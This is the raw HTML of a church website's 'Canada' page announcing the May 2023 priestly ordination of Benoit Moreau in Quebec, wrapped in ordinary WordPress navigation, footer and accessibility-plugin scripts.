2022</span></a></li><li  id="menu-item-2072"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2072 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2021/10/Antioch-Community-Voice-Fall-2021.pdf" class="awb-menu__sub-a"><span>The Voice Fall 2021</span></a></li><li  id="menu-item-2071"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2071 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2021/03/The-Voice-Spring-2021.pdf" class="awb-menu__sub-a"><span>The Voice Spring 2021</span></a></li><li  id="menu-item-2070"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2070 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2020/08/Fall2020NewsLetter.pdf" class="awb-menu__sub-a"><span>The Voice Fall 2020</span></a></li><li  id="menu-item-2069"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2069 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2020/03/COA-newsletter-spring-2020.-final-1.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice 2019-2020</span></a></li><li  id="menu-item-2068"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2068 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2019/07/ANTIOCH-COMMUNITY-VOICE-2017-2019.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice 2017-2019</span></a></li><li  id="menu-item-2067"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2067 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2016/12/Ant.Comm_.Voice_.-Winter-2016-2017.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Winter-2016-2017</span></a></li><li  id="menu-item-2066"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2066 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2016/01/Ant.Comm_.Voice_.-Spring-16.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Spring 2016</span></a></li><li  id="menu-item-2065"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2065 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2015/01/Ant.Comm_.Voice_.-Spring-15.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Spring 2015</span></a></li><li  id="menu-item-2064"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2064 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2014/09/Ant.Comm_.Voice_.-Fall-14.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Fall 2014</span></a></li><li  id="menu-item-2063"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2063 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2014/05/Ant.Comm_.Voice_.-Spring-14.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Spring 2014</span></a></li><li  id="menu-item-2062"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2062 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2013/04/Ant.Comm_.Voice_.-Spring-13.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Spring 2013</span></a></li><li  id="menu-item-2061"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2061 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2012/11/Ant.Comm_.Voice-Fall-12.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Fall 2012</span></a></li><li  id="menu-item-2060"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2060 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2012/07/Antioch-Community-Voice-Summer-2012.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Summer 2012</span></a></li><li  id="menu-item-2059"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2059 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2012/02/Antioch-Community-Voice-Spring-2012.pdf" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; Spring 2012</span></a></li><li  id="menu-item-2058"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2058 awb-menu__li awb-menu__sub-li" ><a  href="http://Antioch%20Community%20Voice%20&ndash;%20December%202011" class="awb-menu__sub-a"><span>Antioch Community Voice &ndash; December 2011</span></a></li></ul></li><li  id="menu-item-2057"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2057 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2057"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="#" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">PHOTOS</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of PHOTOS" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-2834"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2834 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/new-ccoa-bishop/" class="awb-menu__sub-a"><span>New CCOA Bishop!</span></a></li><li  id="menu-item-2767"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2767 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2024/11/2024-Convocation-photo-story.pdf" class="awb-menu__sub-a"><span>2024 Convocation</span></a></li><li  id="menu-item-2654"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2654 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/remembering-ccoas-colleague-rev-paul-r-smith-1937-2024/" class="awb-menu__sub-a"><span>Remembering CCOA&rsquo;s Colleague, Rev. Paul R. Smith. 1937-2024</span></a></li><li  id="menu-item-2508"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2508 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/2023-convocation/" class="awb-menu__sub-a"><span>2023 Convocation</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of 2023 Convocation" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_sub"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_grand"><li  id="menu-item-2509"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2509 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/2023-convocation-chrism-mass/" class="awb-menu__sub-a"><span>2023 Convocation Chrism Mass</span></a></li><li  id="menu-item-2541"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2541 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/2023-convocation-ordination/" class="awb-menu__sub-a"><span>2023 Convocation Ordination</span></a></li><li  id="menu-item-2556"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2556 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/2023-convocation-relationships/" class="awb-menu__sub-a"><span>2023 Convocation Relationships</span></a></li></ul></li><li  id="menu-item-2327"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2327 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/convocation-2022/" class="awb-menu__sub-a"><span>Convocation 2022</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of Convocation 2022" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_sub"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_grand"><li  id="menu-item-2328"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2328 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/convocation-2022-part-1/" class="awb-menu__sub-a"><span>Convocation 2022: Ordination</span></a></li><li  id="menu-item-2333"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2333 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/convocation-2022-worship/" class="awb-menu__sub-a"><span>Convocation 2022: Worship</span></a></li><li  id="menu-item-2337"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2337 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/convocation-2022-enlightenment/" class="awb-menu__sub-a"><span>Convocation 2022: Enlightenment</span></a></li><li  id="menu-item-2344"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2344 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/convocation-2022-relationships/" class="awb-menu__sub-a"><span>Convocation 2022: Relationships</span></a></li></ul></li><li  id="menu-item-1513"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1513 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/convocation-2019-2/" class="awb-menu__sub-a"><span>Convocation, 2019</span></a></li><li  id="menu-item-2425"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2425 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/?page_id=2420" class="awb-menu__sub-a"><span>Divine Savior Catholic Community receives CCOA Charter</span></a></li><li  id="menu-item-2224"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2224 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/st-johns-church-of-antioch-celebrates-10-years/" class="awb-menu__sub-a"><span>St. John&rsquo;s Church of Antioch celebrates 10 years!</span></a></li><li  id="menu-item-2606"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2606 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/ccoa-and-aaocc-sign-intercommubnion-agreement/" class="awb-menu__sub-a"><span>CCOA and AAOCC sign Intercommunion Agreement</span></a></li></ul></li><li  id="menu-item-2710"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2710 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2710"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/intercommunion-agreements/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">INTERCOMMUNION AGREEMENTS</span></a></li><li  id="menu-item-1089"  class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-1089 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="1089"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/ccoa-worldwide/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">INTERNATIONAL</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of INTERNATIONAL" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-1111"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1111 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/ccoa-worldwide/igesia-universal-apostolica-de-antioqui-argentina/" class="awb-menu__sub-a"><span>Argentina</span></a></li><li  id="menu-item-2439"  class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-2430 current_page_item menu-item-has-children menu-item-2439 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/canada/" class="awb-menu__sub-a" aria-current="page"><span>Canada</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of Canada" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_sub"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_grand"><li  id="menu-item-2909"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2909 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/congratulations-bishop-benoit/" class="awb-menu__sub-a"><span>Congratulations Bishop Benoit!</span></a></li></ul></li><li  id="menu-item-1102"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1102 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/ccoa-worldwide/iglesia-catolica-apostolica-de-antioquia-mexico/" class="awb-menu__sub-a"><span>M&eacute;xico</span></a></li><li  id="menu-item-1120"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1120 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/ccoa-worldwide/autocepalous-catholic-church-of-antioch-united-kingdom/" class="awb-menu__sub-a"><span>United Kingdom</span></a></li></ul></li><li  id="menu-item-2051"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2051 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2051"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/informacion-en-espanol/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">EN Espa&ntilde;ol</span></a></li><li  id="menu-item-361"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-361 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="361"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/blog/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">BLOG</span></a></li><li  id="menu-item-2805"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2805 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2805"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/keeping-the-faith/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">KEEPING THE FAITH!</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of KEEPING THE FAITH!" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-2912"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2912 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/congratulations-bishop-benoit/" class="awb-menu__sub-a"><span>Congratulations Bishop Benoit!</span></a></li></ul></li><li  id="menu-item-2933"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2933 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2933"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/words-from-the-past-and-for-today/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">Words from the Past and for Today</span></a></li><li  id="menu-item-2990"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2990 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2990"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/on-trusting-the-holy-spirit-in-the-midst-of-humanitys-dark-night/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">On Trusting the Holy Spirit in the Midst of Humanity&rsquo;s Dark Night</span></a></li><li  id="menu-item-2996"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2996 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2996"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/2025-convocation/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">2025 Convocation</span></a></li></ul></nav></div></div></div></div>
</div>		<div id="sliders-container" class="fusion-slider-visibility">
					</div>
											
			
						<main id="main" class="clearfix ">
				<div class="fusion-row" style="">
<section id="content" style="width: 100%;">
					<div id="post-2430" class="post-2430 page type-page status-publish hentry">
			<span class="entry-title rich-snippet-hidden">Canada</span><span class="vcard rich-snippet-hidden"><span class="fn"><a href="https://www.churchofantioch.org/author/admin1/" title="Posts by admin1" rel="author">admin1</a></span></span><span class="updated rich-snippet-hidden">2023-06-07T07:32:26+00:00</span>
			
			<div class="post-content">
				<p style="text-align: center;"><span style="color: #0000ff;"><strong>Benoit Moreau, of Riviere de Loup, Quebec, Canada,&nbsp;was ordained to the sacred order of the priesthood on May 20, 2023.</strong></span></p>
<p>&nbsp;</p>
<p><a href="https://www.churchofantioch.org/2023-ccoa-fr-benoit-moreau-riviere-de-loup-quebec-ca-5-20-21348551040_1299470923985460_2034154692824752252_n-3/"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-2443" src="https://www.churchofantioch.org/wp-content/uploads/2023/06/2023-CCOA-Fr-Benoit-Moreau-Riviere-de-Loup-Quebec-CA-5-20-21348551040_1299470923985460_2034154692824752252_n-3.jpg" alt="" width="376" height="500" srcset="https://www.churchofantioch.org/wp-content/uploads/2023/06/2023-CCOA-Fr-Benoit-Moreau-Riviere-de-Loup-Quebec-CA-5-20-21348551040_1299470923985460_2034154692824752252_n-3-200x266.jpg 200w, https://www.churchofantioch.org/wp-content/uploads/2023/06/2023-CCOA-Fr-Benoit-Moreau-Riviere-de-Loup-Quebec-CA-5-20-21348551040_1299470923985460_2034154692824752252_n-3-226x300.jpg 226w, https://www.churchofantioch.org/wp-content/uploads/2023/06/2023-CCOA-Fr-Benoit-Moreau-Riviere-de-Loup-Quebec-CA-5-20-21348551040_1299470923985460_2034154692824752252_n-3.jpg 376w" sizes="(max-width: 376px) 100vw, 376px" /></a></p>
<p style="text-align: center;"><em><strong>Bishop Michael, Father Benoit, and Presiding Bishop Mark</strong></em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
							</div>
																													</div>
	</section>
						
					</div>  <!-- fusion-row -->
				</main>  <!-- #main -->
				
				
								
					
		<div class="fusion-footer">
					
	<footer class="fusion-footer-widget-area fusion-widget-area fusion-footer-widget-area-center">
		<div class="fusion-row">
			<div class="fusion-columns fusion-columns-1 fusion-widget-area">
				
																									<div class="fusion-column fusion-column-last col-lg-12 col-md-12 col-sm-12">
							<section id="menu-widget-2" class="fusion-footer-widget-column widget menu" style="border-style: solid;border-color:transparent;border-width:0px;"><style type="text/css">#menu-widget-2{text-align:center;}#fusion-menu-widget-2 li{display:inline-block;}#fusion-menu-widget-2 ul li a{display:inline-block;padding:0;border:0;color:#ccc;font-size:12px;}#fusion-menu-widget-2 ul li a:after{content:"|";color:#ccc;padding-right:25px;padding-left:25px;font-size:12px;}#fusion-menu-widget-2 ul li a:hover,#fusion-menu-widget-2 ul .menu-item.current-menu-item a{color:#fff;}#fusion-menu-widget-2 ul li:last-child a:after{display:none;}#fusion-menu-widget-2 ul li .fusion-widget-cart-number{margin:0 7px;background-color:#fff;color:#ccc;}#fusion-menu-widget-2 ul li.fusion-active-cart-icon .fusion-widget-cart-icon:after{color:#fff;}</style><nav id="fusion-menu-widget-2" class="fusion-widget-menu" aria-label="Secondary navigation"><ul id="menu-bottom" class="menu"><li id="menu-item-2074" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-2074"><a href="https://www.churchofantioch.org">WELCOME</a></li><li id="menu-item-2075" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2075"><a href="https://www.churchofantioch.org/about-the-church/board-of-advisors/">ADMINISTRATION</a></li><li id="menu-item-2076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2076"><a href="https://www.churchofantioch.org/sophia-divinity-school/">SOPHIA DIVINITY SCHOOL</a></li><li id="menu-item-2077" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2077"><a href="https://www.churchofantioch.org/about-the-church/apostolic-succession/">APOSTOLIC SUCCESSION</a></li></ul></nav><div style="clear:both;"></div></section>																					</div>
																																																						
				<div class="fusion-clearfix"></div>
			</div> <!-- fusion-columns -->
		</div> <!-- fusion-row -->
	</footer> <!-- fusion-footer-widget-area -->

	
	<footer id="footer" class="fusion-footer-copyright-area fusion-footer-copyright-center">
		<div class="fusion-row">
			<div class="fusion-copyright-content">

				<div class="fusion-copyright-notice">
		<div>
		Copyright &copy; 2025 &middot; Catholic Apostolic Church of Antioch	</div>
</div>

			</div> <!-- fusion-fusion-copyright-content -->
		</div> <!-- fusion-row -->
	</footer> <!-- #footer -->
		</div> <!-- fusion-footer -->

		
																</div> <!-- wrapper -->
		</div> <!-- #boxed-wrapper -->
				<a class="fusion-one-page-text-link fusion-page-load-link" tabindex="-1" href="#" aria-hidden="true">Page load link</a>

		<div class="avada-footer-scripts">
			<script>				
                    document.addEventListener('DOMContentLoaded', function () {
                        setTimeout(function(){
                            if( document.querySelectorAll('[name^=ct_checkjs]').length > 0 ) {
                                if (typeof apbct_public_sendREST === 'function' && typeof apbct_js_keys__set_input_value === 'function') {
                                    apbct_public_sendREST(
                                    'js_keys__get',
                                    { callback: apbct_js_keys__set_input_value })
                                }
                            }
                        },0)					    
                    })				
                </script><script type="text/javascript">var fusionNavIsCollapsed=function(e){var t,n;window.innerWidth<=e.getAttribute("data-breakpoint")?(e.classList.add("collapse-enabled"),e.classList.remove("awb-menu_desktop"),e.classList.contains("expanded")||window.dispatchEvent(new CustomEvent("fusion-mobile-menu-collapsed",{detail:{nav:e}})),(n=e.querySelectorAll(".menu-item-has-children.expanded")).length&&n.forEach(function(e){e.querySelector(".awb-menu__open-nav-submenu_mobile").setAttribute("aria-expanded","false")})):(null!==e.querySelector(".menu-item-has-children.expanded .awb-menu__open-nav-submenu_click")&&e.querySelector(".menu-item-has-children.expanded .awb-menu__open-nav-submenu_click").click(),e.classList.remove("collapse-enabled"),e.classList.add("awb-menu_desktop"),null!==e.querySelector(".awb-menu__main-ul")&&e.querySelector(".awb-menu__main-ul").removeAttribute("style")),e.classList.add("no-wrapper-transition"),clearTimeout(t),t=setTimeout(()=>{e.classList.remove("no-wrapper-transition")},400),e.classList.remove("loading")},fusionRunNavIsCollapsed=function(){var e,t=document.querySelectorAll(".awb-menu");for(e=0;e<t.length;e++)fusionNavIsCollapsed(t[e])};function avadaGetScrollBarWidth(){var e,t,n,l=document.createElement("p");return l.style.width="100%",l.style.height="200px",(e=document.createElement("div")).style.position="absolute",e.style.top="0px",e.style.left="0px",e.style.visibility="hidden",e.style.width="200px",e.style.height="150px",e.style.overflow="hidden",e.appendChild(l),document.body.appendChild(e),t=l.offsetWidth,e.style.overflow="scroll",t==(n=l.offsetWidth)&&(n=e.clientWidth),document.body.removeChild(e),jQuery("html").hasClass("awb-scroll")&&10<t-n?10:t-n}fusionRunNavIsCollapsed(),window.addEventListener("fusion-resize-horizontal",fusionRunNavIsCollapsed);</script>
		<script>
			window.RS_MODULES = window.RS_MODULES || {};
			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
			window.RS_MODULES.defered = true;
			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
			window.RS_MODULES.type = 'compiled';
		</script>
		<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/Avada-Child-Theme/*","/wp-content/themes/Avada/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script src='//cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js'></script><div id="adarelief-mySidebar" class="adarelief-sidebar"><div class="arsidelinks" style="background: linear-gradient(to right, #2d68ff,#225aea,#174cd6,#0b3ec1,#0030ac)!important; height: 40px!important; width: 100%!important; padding:4px 0px 4px 12px;" ><div class="arsidelinks" style="float: left; width: 250px; line-height: 32px!important;"><span id="arnochange" class="arsidelinks" style="display: flex; color:#fff!important; font-size: 16px!important;">Accessibility Adjustments</span></div><div class="arsidelinks" style="float: right; width: 40px; line-height: 32px!important;"><a style="display: flex; font-size: 31px!important;" href="javascript:void(0)" class="adarelief-closebtn" onclick="adareliefcloseNav(); ADAreliefoffpanelcookie();">&times;</a></div></div><div style="padding:2px!important;background-color: #fff!important;"></div><button class="arsidebutton" id="button-toggle-highcontrastmode"  style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Dark Contrast Button"  src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/high-contrast.png"><br/>Dark Contrast</button><button class="arsidebutton" id="button-toggle-lightcontrastmode" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="High Contrast Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/light-contrast.png"><br/>High Contrast</button><button class="arsidebutton" id="button-toggle-grayscalemode" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Gray Scale Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/mono.png"><br/>Monochrome</button><button class="arsidebutton" id="button-toggle-invertcolors" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Invert Colors Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/invert.png"><br/>Invert Colors</button><button class="arsidebutton" id="button-toggle-saturate" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Saturate Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/saturate.png"><br/>Saturate</button><button class="arsidebutton" id="button-toggle-highlight" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Highlight Links Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/highlight.png"><br/>Highlight Links</button><button class="arsidebutton" id="button-toggle-imgbw" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Remove Images Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/images.png"><br/>Remove Images</button><button class="arsidebutton" id="button-toggle-mousecursor" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Big cursor Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/cursor.png"><br/>Big Mouse Cursor</button><button class="arsidebutton" id="button-toggle-readfont" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Legible Font Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/font.png"><br/>Legible Font</button><button class="arsidebutton" id="button-toggle-dysfont" style="text-align: center; background-color:white;" onclick="#"><img class= "ar-image" alt="Dyslexia Friendly Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/dyslexia.png"><br/>Dyslexia Friendly</button><div class ="clear" style="padding:3px!important;background-color: #fff!important;"></div><button class="arsidebuttonsmall" id="increaseFont" onclick="#">Increase Font +</button><button class="arsidebuttonsmall" id="decreaseFont" onclick="#">- Decrease Font</button><div class="clear" style="background-color: #fff!important;"></div><div class ="clear" style="padding:5px!important;background-color: #fff!important;"></div><div class="adarelief-line"></div><button class="arsidebuttonbig" style="height: 33px!important; text-align:center;" id="button-toggle-resetcookies" onclick="#"><img style="padding-right: 10px;" class= "ar-image" alt="Reset Button" src="https://www.churchofantioch.org/wp-content/plugins/ada-relief/lib/img/reset.png"><span style="margin-top: 6px;">RESET SETTINGS</span></button><div style="padding:5px!important;background-color: #fff!important;"></div><button class="arsidebuttoncredit" onclick="window.open('https://morepro.com/ada-relief/','_blank')">Powered By MorePro ADA-Relief</button></div>
	<div id="adarelief-main">
	<button class="adarelief-openbtnred" onclick="adareliefopenNav(); ADAreliefsetpanelcookie();" aria-label="Accessibility Options Toggle"></button>
	</div><script>
	function ADAreliefsetpanelcookie() {var d = new Date();
    d.setTime(d.getTime() + (86400 * 90));
    var expires = 'expires='+d.toUTCString();
    document.cookie = 'wp-adarelief' + '=' + 1 + ';' + expires + ';path=/';}
	</script><script>
	function ADAreliefoffpanelcookie() {
	document.cookie = 'wp-adarelief' + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';}
	</script><script>
function adareliefopenNav() {
  document.getElementById("adarelief-mySidebar").style.width = "314px";
  document.getElementById("adarelief-main").style.marginRight = "220px";var alladael = document.getElementsByClassName("adarelief-openbtnred");
	for (var i = 0; i < alladael.length; i++) {
	alladael[i].style.display = "none";
	}
	var alladael = document.getElementsByClassName("adarelief-openbtnrightred");
	for (var i = 0; i < alladael.length; i++) {
	alladael[i].style.display = "none";
	}
	
  
  
  
}
</script>
<script>
function adareliefcloseNav() {
  document.getElementById("adarelief-mySidebar").style.width = "0";
  document.getElementById("adarelief-main").style.marginRight = "0";var alladael = document.getElementsByClassName("adarelief-openbtnred");
	for (var i = 0; i < alladael.length; i++) {
	alladael[i].style.display = "block";
	}
  var alladael = document.getElementsByClassName("adarelief-openbtnrightred");
